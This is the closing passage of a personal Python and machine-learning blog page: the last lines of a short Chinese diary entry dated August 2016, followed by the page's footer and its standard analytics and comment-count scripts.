<li>计划的练手的项目给写了。  </li>
</ul>
<p>先这样吧。</p>
<p>2016年08月17日18:17:19</p>
  </div>
</article>

  <div class="pagination">
    <a class="btn" href="http://littlezz.github.io/index2.html">
      <i class="fa fa-angle-left"></i> Older Posts
    </a>
  </div>

    <footer>
        <p>&copy; littlezz 2017</p>
<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p>    </footer>
  </main>

<!-- Google Analytics -->
<script type="text/javascript">
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-102694300-1', 'auto');
  ga('send', 'pageview');
</script>
<!-- End Google Analytics -->



<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " littlezz's Blog ",
  "url" : "http://littlezz.github.io",
  "image": "/images/logo.jpg",
  "description": "littlezz's Thoughts and Writings About Python And Machine Learning and diary"
}
</script><script type="text/javascript">
    var disqus_shortname = 'littlezz';
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>
</body>
</html>